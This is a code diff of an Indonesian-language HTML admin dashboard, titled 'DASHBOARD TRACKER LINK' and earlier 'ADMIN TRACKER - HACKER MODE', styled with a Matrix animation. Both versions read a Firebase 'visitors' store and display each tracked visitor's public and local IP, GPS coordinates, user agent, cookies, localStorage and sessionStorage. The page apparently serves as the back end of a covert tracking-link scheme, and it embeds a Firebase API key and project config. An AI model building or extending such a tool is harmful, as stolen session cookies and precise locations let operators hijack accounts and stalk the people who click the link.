@@ -6,101 +6,79 @@
   <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
   <style>
-    html, body {
+    body {
       margin: 0;
-      padding: 0;
-      height: 100%;
+      font-family: 'Courier New', monospace;
       background: black;
-      font-family: monospace;
+      color: #00FF00;
+      overflow-x: hidden;
     }
-
     canvas {
       position: fixed;
       top: 0;
       left: 0;
-      z-index: 0;
+      z-index: -1;
     }
-
-    .content {
-      position: relative;
-      z-index: 1;
-      color: #00FF00;
-      padding: 20px;
+    h1 {
+      text-align: center;
+      margin-top: 20px;
     }
-
-    h1, h2 {
-      color: #00FF00;
-    }
-
-    #button-list {
+    #buttons {
       display: flex;
       flex-direction: column;
+      align-items: center;
+      margin-top: 20px;
       gap: 10px;
-      margin-bottom: 20px;
     }
-
-    .visitor-button {
-      background-color: #002200;
+    button {
+      background-color: #003300;
+      border: 1px solid #00FF00;
       color: #00FF00;
-      border: 1px solid #00FF00;
-      padding: 12px 16px;
+      padding: 8px 16px;
+      border-radius: 6px;
       cursor: pointer;
-      font-size: 14px;
-      border-radius: 10px;
-      text-align: left;
-      transition: background 0.2s;
+      font-weight: bold;
     }
-
-    .visitor-button:hover {
-      background-color: #004400;
+    button:hover {
+      background-color: #005500;
     }
-
     .info-card {
-      background: #001100;
       border: 1px solid #00FF00;
-      padding: 15px;
-      margin: 10px 0 20px 0;
-      border-radius: 10px;
-      display: none;
+      border-radius: 12px;
+      padding: 12px;
+      margin: 10px auto;
+      max-width: 600px;
+      background: rgba(0, 255, 0, 0.1);
+      font-size: 14px;
     }
-
+    .select-remove {
+      margin: 20px auto;
+      text-align: center;
+    }
     select {
       background: black;
       color: #00FF00;
       border: 1px solid #00FF00;
-      padding: 5px;
-      margin-top: 10px;
-    }
-
-    .delete-btn {
-      background: darkred;
-      color: white;
-      margin-left: 10px;
       padding: 5px 10px;
-      border: none;
-      border-radius: 5px;
+      font-family: 'Courier New';
+      border-radius: 6px;
     }
   </style>
 </head>
 <body>
   <canvas id="matrixCanvas"></canvas>
-
-  <div class="content">
-    <h1>ADMIN TRACKER - HACKER MODE</h1>
-
-    <h2>Data Pengunjung:</h2>
-    <div id="button-list"></div>
-
-    <h2>Hapus Data</h2>
-    <select id="delete-select">
-      <option value="">Pilih data untuk dihapus</option>
+  <h1>DASHBOARD TRACKER LINK</h1>
+  <div class="select-remove">
+    <label for="entrySelect">Hapus Data Pengunjung:</label>
+    <select id="entrySelect">
+      <option value="">Pilih Data</option>
     </select>
-    <button class="delete-btn" onclick="deleteSelected()">Hapus</button>
-
-    <div id="info-container"></div>
+    <button onclick="hapusData()">Hapus</button>
   </div>
+  <div id="buttons"></div>
 
   <script>
+    // Firebase config
     const firebaseConfig = {
       apiKey: "AIzaSyCB_wr4EqhPRzSWQuLgr-eyV9Zisw8_rIs",
       authDomain: "xr-social-53646.firebaseapp.com",
@@ -108,131 +86,122 @@
       projectId: "xr-social-53646",
       storageBucket: "xr-social-53646.appspot.com",
       messagingSenderId: "55685443011",
-      appId: "1:55685443011:web:ef0f9de8e329d24d512176"
+      appId: "1:55685443011:web:ef0f9de8e329d24d512176",
+      measurementId: "G-LTMZD79ZWX"
     };
-
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
-    const buttonList = document.getElementById('button-list');
-    const infoContainer = document.getElementById('info-container');
-    const deleteSelect = document.getElementById('delete-select');
+    const buttonsContainer = document.getElementById('buttons');
+    const entrySelect = document.getElementById('entrySelect');
 
-    function renderInfoCard(key, data, index) {
-      const button = document.createElement('button');
-      button.className = 'visitor-button';
-      button.textContent = `#${index + 1} - Klik untuk lihat detail`;
-      button.onclick = () => {
-        const card = document.getElementById('card-' + key);
-        card.style.display = (card.style.display === 'block') ? 'none' : 'block';
+    function createInfoCard(data, number, key) {
+      const btn = document.createElement('button');
+      btn.innerText = `Informasi #${number}`;
+      btn.onclick = () => {
+        const existing = document.getElementById('info-' + key);
+        if (existing) {
+          existing.remove();
+        } else {
+          const card = document.createElement('div');
+          card.className = 'info-card';
+          card.id = 'info-' + key;
+          card.innerHTML = `
+            <div style="margin-bottom: 10px;">
+              <strong>🕒 Waktu:</strong> ${data.timestamp}<br>
+              <strong>🌐 IP Publik:</strong> ${data.ip}<br>
+              <strong>🏠 IP Lokal:</strong> ${data.localIP || '-'}<br>
+            </div>
+            <div style="margin-bottom: 10px;">
+              <strong>📍 Lokasi:</strong><br>
+              Latitude: ${data.latitude || '-'}<br>
+              Longitude: ${data.longitude || '-'}<br>
+              Akurasi: ${data.accuracy || '-'}
+            </div>
+            <div style="margin-bottom: 10px;">
+              <strong>🧭 Referer:</strong> ${data.referer || '-'}<br>
+              <strong>🧪 User Agent:</strong><br>
+              <div style="white-space: pre-wrap;">${data.userAgent}</div>
+            </div>
+            <div style="margin-bottom: 10px;">
+              <strong>🍪 Cookies:</strong><br>
+              <div style="white-space: pre-wrap;">${data.cookies}</div>
+            </div>
+            <div style="margin-bottom: 10px;">
+              <strong>📦 LocalStorage:</strong><br>
+              <div style="white-space: pre-wrap;">${data.localStorage}</div>
+            </div>
+            <div style="margin-bottom: 10px;">
+              <strong>💾 SessionStorage:</strong><br>
+              <div style="white-space: pre-wrap;">${data.sessionStorage}</div>
+            </div>
+          `;
+          btn.insertAdjacentElement('afterend', card);
+        }
       };
-      buttonList.appendChild(button);
+      buttonsContainer.appendChild(btn);
 
-      const opt = document.createElement('option');
-      opt.value = key;
-      opt.textContent = `Data #${index + 1} (${data.timestamp})`;
-      deleteSelect.appendChild(opt);
-
-      const card = document.createElement('div');
-      card.className = 'info-card';
-      card.innerHTML = `
-  <div style="margin-bottom: 10px;">
-    <strong>🕒 Waktu:</strong> ${data.timestamp}<br>
-    <strong>🌐 IP Publik:</strong> ${data.ip}<br>
-    <strong>🏠 IP Lokal:</strong> ${data.localIP}<br>
-  </div>
-
-  <div style="margin-bottom: 10px;">
-    <strong>📍 Lokasi:</strong><br>
-    Latitude: ${data.latitude}<br>
-    Longitude: ${data.longitude}<br>
-    Akurasi: ${data.accuracy}
-  </div>
-
-  <div style="margin-bottom: 10px;">
-    <strong>🧭 Referer:</strong> ${data.referer || "-"}<br>
-    <strong>🧪 User Agent:</strong><br>
-    <div style="white-space: pre-wrap;">${data.userAgent}</div>
-  </div>
-
-  <div style="margin-bottom: 10px;">
-    <strong>🍪 Cookies:</strong><br>
-    <div style="white-space: pre-wrap;">${data.cookies}</div>
-  </div>
-
-  <div style="margin-bottom: 10px;">
-    <strong>📦 LocalStorage:</strong><br>
-    <div style="white-space: pre-wrap;">${data.localStorage}</div>
-  </div>
-
-  <div style="margin-bottom: 10px;">
-    <strong>💾 SessionStorage:</strong><br>
-    <div style="white-space: pre-wrap;">${data.sessionStorage}</div>
-  </div>
-`;
-      infoContainer.appendChild(card);
+      const option = document.createElement('option');
+      option.value = key;
+      option.text = `#${number}`;
+      entrySelect.appendChild(option);
     }
 
-    function deleteSelected() {
-      const key = deleteSelect.value;
-      if (!key) return alert("Pilih data terlebih dahulu!");
-      if (confirm("Yakin mau hapus data ini?")) {
-        db.ref('visitors/' + key).remove();
+    function hapusData() {
+      const selected = entrySelect.value;
+      if (selected) {
+        db.ref('visitors/' + selected).remove();
+        document.getElementById('info-' + selected)?.remove();
+        location.reload();
       }
     }
 
-    db.ref('visitors').on('value', snapshot => {
-      buttonList.innerHTML = '';
-      infoContainer.innerHTML = '';
-      deleteSelect.innerHTML = '<option value="">Pilih data untuk dihapus</option>';
-
+    db.ref('visitors').once('value', snapshot => {
       const data = snapshot.val();
-      if (!data) {
-        buttonList.innerHTML = '<p>Belum ada data pengunjung.</p>';
-        return;
+      if (data) {
+        let count = 1;
+        Object.entries(data).forEach(([key, val]) => {
+          createInfoCard(val, count, key);
+          count++;
+        });
       }
-
-      const keys = Object.keys(data).reverse();
-      keys.forEach((key, index) => {
-        renderInfoCard(key, data[key], index);
-      });
     });
 
-    // MATRIX ANIMATION
-    const canvas = document.getElementById('matrixCanvas');
-    const ctx = canvas.getContext('2d');
+    // CMATRIX BACKGROUND
+    const canvas = document.getElementById("matrixCanvas");
+    const ctx = canvas.getContext("2d");
+    canvas.height = window.innerHeight;
+    canvas.width = window.innerWidth;
 
-    function setupCanvas() {
-      canvas.width = window.innerWidth;
-      canvas.height = window.innerHeight;
-    }
+    const katakana = "アカサタナハマヤラワンアイウエオ";
+    const latin = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+    const nums = "0123456789";
+    const alphabet = (katakana + latin + nums).split("");
 
-    setupCanvas();
-
-    const katakana = "アイウエオカキクケコサシスセソタチツテトナニヌネノマミムメモ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
-    const characters = katakana.split("");
     const fontSize = 14;
-    const columns = Math.floor(canvas.width / fontSize);
-    const drops = Array(columns).fill(1);
+    const columns = canvas.width / fontSize;
+    const drops = Array(Math.floor(columns)).fill(1);
 
-    function drawMatrix() {
+    function draw() {
       ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
       ctx.fillRect(0, 0, canvas.width, canvas.height);
-      ctx.fillStyle = "#00FF00";
+
+      ctx.fillStyle = "#0F0";
       ctx.font = fontSize + "px monospace";
 
-      for (let i = 0; i < drops.length; i++) {
-        const text = characters[Math.floor(Math.random() * characters.length)];
-        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
-          drops[i] = 0;
+      drops.forEach((y, x) => {
+        const text = alphabet[Math.floor(Math.random() * alphabet.length)];
+        ctx.fillText(text, x * fontSize, y * fontSize);
+
+        if (y * fontSize > canvas.height && Math.random() > 0.975) {
+          drops[x] = 0;
         }
-        drops[i]++;
-      }
+
+        drops[x]++;
+      });
     }
 
-    setInterval(drawMatrix, 33);
-    window.addEventListener('resize', setupCanvas);
+    setInterval(draw, 33);
   </script>
 </body>
 </html>
